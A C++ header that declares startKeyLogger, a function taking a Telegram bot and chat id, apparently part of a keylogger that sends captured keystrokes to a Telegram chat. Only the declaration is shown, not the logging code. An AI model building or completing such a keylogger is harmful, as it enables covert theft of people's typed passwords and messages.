#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <iostream>
#include <tgbot/tgbot.h>

void startKeyLogger(const TgBot::Bot& bot_ref, const int64_t chat_id);

#endif